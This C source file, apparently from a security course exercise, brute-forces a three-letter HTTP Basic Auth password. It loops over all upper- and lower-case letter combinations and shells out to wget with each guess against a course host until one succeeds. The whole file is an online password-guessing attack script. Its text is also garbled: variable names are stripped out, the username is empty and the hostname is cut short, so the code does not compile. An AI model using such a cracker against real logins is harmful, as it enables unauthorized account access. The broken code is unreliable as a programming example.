#include <sys/times.h>
#include <strings.h>
#include <string.h>
#include <ctype.h>

#include <stdio.h>
#include <stdlib.h>
#include <sys/times.h>
#include <strings.h>
#include <string.h>
#include <ctype.h>
#include <sys/time.h>
#define ant 1e9

int ()
{
char c[2],[3][2];
register int i,j,k,x,y,z,t,r,s,final,count=0;
int starttime,endtime,totaltime; 
char ch[5],ch1[5],ch2[5],s1[100],s2[100];
c[0]='A',c[1]='a';
[0][1]=[1][1]=[2][1]='\0';

strcpy(s1, "wget --http-user= --http-passwd=");
    strcpy(s2, " http://sec-crack.cs.rmit.edu./SEC/2/");

starttime=time();

for(r=0;r<=1;r++)
{
	
	for(i=c[r],x=0;x<=25;x++,i++)
	{
		
		 [0][0]=i;
		 strcpy(ch,[0]);


		for(s=0;s<=1;s++)
		{
			for(j=c[s],z=0;z<=25;z++,j++)
			{	
		
				[1][0]=j;
				strcpy(ch1,[0]);
				strcat(ch1,[1]);

				for(t=0;t<=1;t++)
				{
					for(k=c[t],y=0;y<=25;y++,k++)
					{	count++;
						[2][0]=k;
						strcpy(ch2,ch1);
						strcat(ch2,[2]);
						printf("\n  %s",ch2);



         strcat(s1, ch2);
          strcat(s1, s2);
	  printf("\n combination sent %s\n", s1);
          final = system(s1);
          if (final == 0)
          {
            endtime=time();
		totaltime=(endtime-starttime);
		 printf("count %d",count);
	    printf("totaltime %1f",(double)totaltime/ant);
	    printf("\nsuccess %s\n",ch2);
            exit(1);
          }


	  strcpy(s1, "");
	  strcpy(s1, "wget --http-user= --http-passwd=");


				}

				}
			}

		}
	   }
}

}



